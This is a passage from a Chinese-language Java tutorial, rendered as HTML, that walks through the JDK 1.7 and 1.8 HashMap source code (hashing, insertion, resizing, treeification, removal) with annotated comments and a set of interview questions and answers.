bucketIndex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">createEntry</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">int</span> bucketIndex)</span> </span>&#123;</span><br><span class="line">        Entry&lt;K,V&gt; e = table[bucketIndex];</span><br><span class="line">        <span class="comment">//原来table[i]下面的映射关系作为新的映射关系next</span></span><br><span class="line">        table[bucketIndex] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">        size++;<span class="comment">//个数增加</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>1、put(key,value)</p><p>（1）当第一次添加映射关系时，数组初始化为一个长度为<strong>16</strong>的<strong>HashMap$Entry</strong>的数组，这个HashMap$Entry类型是实现了java.util.<strong>Map.Entry</strong>接口</p><p>（2）特殊考虑：如果key为null，index直接是[0]</p><p>（3）在计算index之前，会对key的hashCode()值，做一个hash(key)再次哈希的运算，这样可以使得Entry对象更加散列的存储到table中</p><p>（4）计算index = table.length-1 &amp; hash;</p><p>（5）如果table[index]下面，已经有映射关系的key与我要添加的新的映射关系的key相同了，会用新的value替换旧的value。</p><p>（6）如果没有相同的，会把新的映射关系添加到链表的头，原来table[index]下面的Entry对象连接到新的映射关系的next中。</p><p>（7）添加之前先判断if(size &gt;= threshold  &amp;&amp;  table[index]!=null)如果该条件为true，会扩容</p><p>​    if(size &gt;= threshold  &amp;&amp;  table[index]!=null){</p><p>​        ①会扩容</p><p>​        ②会重新计算key的hash</p><p>​        ③会重新计算index</p><p>​    }</p><p>2、get(key)</p><p>（1）计算key的hash值，用这个方法hash(key)</p><p>（2）找index = table.length-1 &amp; hash;</p><p>（3）如果table[index]不为空，那么就挨个比较哪个Entry的key与它相同，就返回它的value</p><p>3、remove(key)</p><p>（1）计算key的hash值，用这个方法hash(key)</p><p>（2）找index = table.length-1 &amp; hash;</p><p>（3）如果table[index]不为空，那么就挨个比较哪个Entry的key与它相同，就删除它，把它前面的Entry的next的值修改为被删除Entry的next</p><h4 id="JDK1-8源码"><a href="#JDK1-8源码" class="headerlink" title="JDK1.8源码"></a>JDK1.8源码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">几个常量和变量：</span><br><span class="line">（<span class="number">1</span>）DEFAULT_INITIAL_CAPACITY：默认的初始容量 <span class="number">16</span></span><br><span class="line">（<span class="number">2</span>）MAXIMUM_CAPACITY：最大容量  <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line">（<span class="number">3</span>）DEFAULT_LOAD_FACTOR：默认加载因子 <span class="number">0.75</span></span><br><span class="line">（<span class="number">4</span>）TREEIFY_THRESHOLD：默认树化阈值<span class="number">8</span>，当链表的长度达到这个值后，要考虑树化</span><br><span class="line">（<span class="number">5</span>）UNTREEIFY_THRESHOLD：默认反树化阈值<span class="number">6</span>，当树中的结点的个数达到这个阈值后，要考虑变为链表</span><br><span class="line">（<span class="number">6</span>）MIN_TREEIFY_CAPACITY：最小树化容量<span class="number">64</span></span><br><span class="line">当单个的链表的结点个数达到<span class="number">8</span>，并且table的长度达到<span class="number">64</span>，才会树化。</span><br><span class="line">当单个的链表的结点个数达到<span class="number">8</span>，但是table的长度未达到<span class="number">64</span>，会先扩容</span><br><span class="line">（<span class="number">7</span>）Node&lt;K,V&gt;[] table：数组</span><br><span class="line">（<span class="number">8</span>）size：记录有效映射关系的对数，也是Entry对象的个数</span><br><span class="line">（<span class="number">9</span>）<span class="keyword">int</span> threshold：阈值，当size达到阈值时，考虑扩容</span><br><span class="line">（<span class="number">10</span>）<span class="keyword">double</span> loadFactor：加载因子，影响扩容的频率</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; </span><br><span class="line">    <span class="comment">// all other fields defaulted，其他字段都是默认值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//目的：干扰hashCode值</span></span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h;</span><br><span class="line"><span class="comment">//如果key是null，hash是0</span></span><br><span class="line"><span class="comment">//如果key非null，用key的hashCode值 与 key的hashCode值高16进行异或</span></span><br><span class="line"><span class="comment">//即就是用key的hashCode值高16位与低16位进行了异或的干扰运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">index = hash &amp; table.length-1</span></span><br><span class="line"><span class="comment">如果用key的原始的hashCode值  与 table.length-1 进行按位与，那么基本上高16没机会用上。</span></span><br><span class="line"><span class="comment">这样就会增加冲突的概率，为了降低冲突的概率，把高16位加入到hash信息中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">       <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">       Node&lt;K,V&gt;[] tab; <span class="comment">//数组</span></span><br><span class="line">Node&lt;K,V&gt; p; <span class="comment">//一个结点</span></span><br><span class="line"><span class="keyword">int</span> n, i;<span class="comment">//n是数组的长度   i是下标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tab和table等价</span></span><br><span class="line"><span class="comment">//如果table是空的</span></span><br><span class="line">       <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)&#123;</span><br><span class="line">           n = (tab = resize()).length;</span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">tab = resize();</span></span><br><span class="line"><span class="comment">n = tab.length;*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果table是空的，resize()完成了①创建了一个长度为16的数组②threshold = 12</span></span><br><span class="line"><span class="comment">n = 16</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">//i = (n - 1) &amp; hash ，下标 = 数组长度-1 &amp; hash</span></span><br><span class="line"><span class="comment">//p = tab[i] 第1个结点</span></span><br><span class="line"><span class="comment">//if(p==null) 条件满足的话说明 table[i]还没有元素</span></span><br><span class="line"><span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//把新的映射关系直接放入table[i]</span></span><br><span class="line">           tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//newNode（）方法就创建了一个Node类型的新结点，新结点的next是null</span></span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           Node&lt;K,V&gt; e; </span><br><span class="line">K k;</span><br><span class="line"><span class="comment">//p是table[i]中第一个结点</span></span><br><span class="line"><span class="comment">//if(table[i]的第一个结点与新的映射关系的key重复)</span></span><br><span class="line">           <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">               ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))&#123;</span><br><span class="line">               e = p;<span class="comment">//用e记录这个table[i]的第一个结点</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)&#123;<span class="comment">//如果table[i]第一个结点是一个树结点</span></span><br><span class="line">               <span class="comment">//单独处理树结点</span></span><br><span class="line">               <span class="comment">//如果树结点中，有key重复的，就返回那个重复的结点用e接收，即e!=null</span></span><br><span class="line">               <span class="comment">//如果树结点中，没有key重复的，就把新结点放到树中，并且返回null，即e=null</span></span><br><span class="line">e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">           &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//table[i]的第一个结点不是树结点，也与新的映射关系的key不重复</span></span><br><span class="line"><span class="comment">//binCount记录了table[i]下面的结点的个数</span></span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line"><span class="comment">//如果p的下一个结点是空的，说明当前的p是最后一个结点</span></span><br><span class="line">                   <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//把新的结点连接到table[i]的最后</span></span><br><span class="line">                       p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果binCount&gt;=8-1，达到7个时</span></span><br><span class="line">                       <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>)&#123; <span class="comment">// -1 for 1st</span></span><br><span class="line">                           <span class="comment">//要么扩容，要么树化</span></span><br><span class="line">treeifyBin(tab, hash);</span><br><span class="line">&#125;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   &#125;</span><br><span class="line"><span class="comment">//如果key重复了，就跳出for循环，此时e结点记录的就是那个key重复的结点</span></span><br><span class="line">           <span class="keyword">if</span> (e.hash == hash &amp;&amp;((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))&#123;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">                   p = e;<span class="comment">//下一次循环，e=p.next，就类似于e=e.next，往链表下移动</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"><span class="comment">//如果这个e不是null，说明有key重复，就考虑替换原来的value</span></span><br><span class="line">           <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">               V oldValue = e.value;</span><br><span class="line">               <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)&#123;</span><br><span class="line">                   e.value = value;</span><br><span class="line">&#125;</span><br><span class="line">               afterNodeAccess(e);<span class="comment">//什么也没干</span></span><br><span class="line">               <span class="keyword">return</span> oldValue;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       ++modCount;</span><br><span class="line"></span><br><span class="line"><span class="comment">//元素个数增加</span></span><br><span class="line"><span class="comment">//size达到阈值</span></span><br><span class="line">       <span class="keyword">if</span> (++size &gt; threshold)&#123;</span><br><span class="line">           resize();<span class="comment">//一旦扩容，重新调整所有映射关系的位置</span></span><br><span class="line">&#125;</span><br><span class="line">       afterNodeInsertion(evict);<span class="comment">//什么也没干</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">       Node&lt;K,V&gt;[] oldTab = table;<span class="comment">//oldTab原来的table</span></span><br><span class="line"><span class="comment">//oldCap：原来数组的长度</span></span><br><span class="line">       <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line"></span><br><span class="line"><span class="comment">//oldThr：原来的阈值</span></span><br><span class="line">       <span class="keyword">int</span> oldThr = threshold;<span class="comment">//最开始threshold是0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//newCap，新容量</span></span><br><span class="line"><span class="comment">//newThr：新阈值</span></span><br><span class="line">       <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;<span class="comment">//说明原来不是空数组</span></span><br><span class="line">           <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;<span class="comment">//是否达到数组最大限制</span></span><br><span class="line">               threshold = Integer.MAX_VALUE;</span><br><span class="line">               <span class="keyword">return</span> oldTab;</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                    oldCap &gt;= DEFAULT_INITIAL_CAPACITY)&#123;</span><br><span class="line"><span class="comment">//newCap = 旧的容量*2 ，新容量&lt;最大数组容量限制</span></span><br><span class="line"><span class="comment">//新容量：32,64，...</span></span><br><span class="line"><span class="comment">//oldCap &gt;= 初始容量16</span></span><br><span class="line"><span class="comment">//新阈值重新算 = 24，48 ....</span></span><br><span class="line">               newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">&#125;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>)&#123; <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">           newCap = oldThr;</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">           newCap = DEFAULT_INITIAL_CAPACITY;<span class="comment">//新容量是默认初始化容量16</span></span><br><span class="line"><span class="comment">//新阈值= 默认的加载因子 * 默认的初始化容量 = 0.75*16 = 12</span></span><br><span class="line">           newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">           newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">       &#125;</span><br><span class="line">       threshold = newThr;<span class="comment">//阈值赋值为新阈值12，24.。。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建了一个新数组，长度为newCap，16，32,64.。。</span></span><br><span class="line">       <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">           Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">       table = newTab;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;<span class="comment">//原来不是空数组</span></span><br><span class="line"><span class="comment">//把原来的table中映射关系，倒腾到新的table中</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">               Node&lt;K,V&gt; e;</span><br><span class="line">               <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;<span class="comment">//e是table下面的结点</span></span><br><span class="line">                   oldTab[j] = <span class="keyword">null</span>;<span class="comment">//把旧的table[j]位置清空</span></span><br><span class="line">                   <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)<span class="comment">//如果是最后一个结点</span></span><br><span class="line">                       newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;<span class="comment">//重新计算e的在新table中的存储位置，然后放入</span></span><br><span class="line">                   <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)<span class="comment">//如果e是树结点</span></span><br><span class="line"><span class="comment">//把原来的树拆解，放到新的table</span></span><br><span class="line">                       ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">                   <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                       Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                       Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                       Node&lt;K,V&gt; next;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">把原来table[i]下面的整个链表，重新挪到了新的table中</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">                       <span class="keyword">do</span> &#123;</span><br><span class="line">                           next = e.next;</span><br><span class="line">                           <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                               <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                                   loHead = e;</span><br><span class="line">                               <span class="keyword">else</span></span><br><span class="line">                                   loTail.next = e;</span><br><span class="line">                               loTail = e;</span><br><span class="line">                           &#125;</span><br><span class="line">                           <span class="keyword">else</span> &#123;</span><br><span class="line">                               <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                                   hiHead = e;</span><br><span class="line">                               <span class="keyword">else</span></span><br><span class="line">                                   hiTail.next = e;</span><br><span class="line">                               hiTail = e;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                       <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                           loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                           newTab[j] = loHead;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                           hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                           newTab[j + oldCap] = hiHead;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> newTab;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">Node&lt;K,V&gt; <span class="title">newNode</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建一个新结点</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> Node&lt;&gt;(hash, key, value, next);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="keyword">int</span> hash)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> n, index; </span><br><span class="line">Node&lt;K,V&gt; e;</span><br><span class="line"><span class="comment">//MIN_TREEIFY_CAPACITY：最小树化容量64</span></span><br><span class="line"><span class="comment">//如果table是空的，或者  table的长度没有达到64</span></span><br><span class="line">       <span class="keyword">if</span> (tab == <span class="keyword">null</span> || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">           resize();<span class="comment">//先扩容</span></span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ((e = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//用e记录table[index]的结点的地址</span></span><br><span class="line">           TreeNode&lt;K,V&gt; hd = <span class="keyword">null</span>, tl = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">do...while，把table[index]链表的Node结点变为TreeNode类型的结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">           <span class="keyword">do</span> &#123;</span><br><span class="line">               TreeNode&lt;K,V&gt; p = replacementTreeNode(e, <span class="keyword">null</span>);</span><br><span class="line">               <span class="keyword">if</span> (tl == <span class="keyword">null</span>)</span><br><span class="line">                   hd = p;<span class="comment">//hd记录根结点</span></span><br><span class="line">               <span class="keyword">else</span> &#123;</span><br><span class="line">                   p.prev = tl;</span><br><span class="line">                   tl.next = p;</span><br><span class="line">               &#125;</span><br><span class="line">               tl = p;</span><br><span class="line">           &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//如果table[index]下面不是空</span></span><br><span class="line">           <span class="keyword">if</span> ((tab[index] = hd) != <span class="keyword">null</span>)</span><br><span class="line">               hd.treeify(tab);<span class="comment">//将table[index]下面的链表进行树化</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>1、添加过程</p><p>（1）当第一次添加映射关系时，数组初始化为一个长度为<strong>16</strong>的<strong>HashMap$Node</strong>的数组，这个HashMap$Node类型是实现了java.util.<strong>Map.Entry</strong>接口</p><p>（2）在计算index之前，会对key的hashCode()值，做一个hash(key)再次哈希的运算，这样可以使得Entry对象更加散列的存储到table中</p><blockquote><p>JDK1.8关于hash(key)方法的实现比JDK1.7要简洁。 key.hashCode() ^ key.Code()&gt;&gt;&gt;16;</p></blockquote><p>（3）计算index = table.length-1 &amp; hash;</p><p>（4）如果table[index]下面，已经有映射关系的key与我要添加的新的映射关系的key相同了，会用新的value替换旧的value。</p><p>（5）如果没有相同的，</p><p>①table[index]链表的长度没有达到8个，会把新的映射关系添加到链表的尾</p><p>②table[index]链表的长度达到8个，但是table.length没有达到64，会先对table进行扩容，然后再添加</p><p>③table[index]链表的长度达到8个，并且table.length达到64，会先把该分支进行树化，结点的类型变为TreeNode，然后把链表转为一棵红黑树</p><p>④table[index]本来就已经是红黑树了，那么直接连接到树中，可能还会考虑考虑左旋右旋以保证树的平衡问题</p><p>（6）添加完成后判断if(size &gt; threshold ){</p><p>​        ①会扩容</p><p>​        ②会重新计算key的hash</p><p>​        ③会重新计算index</p><p>​    }</p><p>2、remove(key)</p><p>（1）计算key的hash值，用这个方法hash(key)</p><p>（2）找index = table.length-1 &amp; hash;</p><p>（3）如果table[index]不为空，那么就挨个比较哪个Entry的key与它相同，就删除它，把它前面的Entry的next的值修改为被删除Entry的next</p><p>（4）如果table[index]下面原来是红黑树，结点删除后，个数小于等于6，会把红黑树变为链表</p><h3 id="12-6-5-关于HashMap的面试问题"><a href="#12-6-5-关于HashMap的面试问题" class="headerlink" title="12.6.5 关于HashMap的面试问题"></a>12.6.5 关于HashMap的面试问题</h3><p>1、HashMap的底层实现</p><blockquote><p>答：JDK1.7是数组+链表，JDK1.8是数组+链表/红黑树</p></blockquote><p>2、HashMap的数组的元素类型</p><blockquote><p>答：java.util.Map$Entry接口类型。</p><p>JDK1.7的HashMap中有内部类Entry实现Entry接口</p><p>JDK1.8的HashMap中有内部类Node和TreeNode类型实现Entry接口</p></blockquote><p>3、为什么要使用数组？</p><blockquote><p> 答：因为数组的访问的效率高</p></blockquote><p>4、为什么数组还需要链表？或问如何解决hash或[index]冲突问题？</p><blockquote><p> 答：为了解决hash和[index]冲突问题</p><p> （1）两个不相同的key的hashCode值本身可能相同</p><p> （2）两个hashCode不相同的key，通过hash(key)以及 hash &amp; table.length-1运算得到的[index]可能相同</p><p> 那么意味着table[index]下可能需要存储多个Entry的映射关系对象，所以需要链表</p></blockquote><p>5、HashMap的数组的初始化长度</p><blockquote><p>答：默认的初始容量值是16</p></blockquote><p>6、HashMap的映射关系的存储索引index如何计算</p><blockquote><p>答：hash &amp; table.length-1</p></blockquote><p>7、为什么要使用hashCode()? 空间换时间</p><blockquote><p>答：因为hashCode()是一个整数值，可以用来直接计算index，效率比较高，用数组这种结构虽然会浪费一些空间，但是可以提高查询效率。</p></blockquote><p>8、hash()函数的作用是什么</p><blockquote><p> 答：在计算index之前，会对key的hashCode()值，做一个hash(key)再次哈希的运算，这样可以使得Entry对象更加散列的存储到table中</p><p> JDK1.8关于hash(key)方法的实现比JDK1.7要简洁。 key.hashCode() ^ key.Code()&gt;&gt;&gt;16; 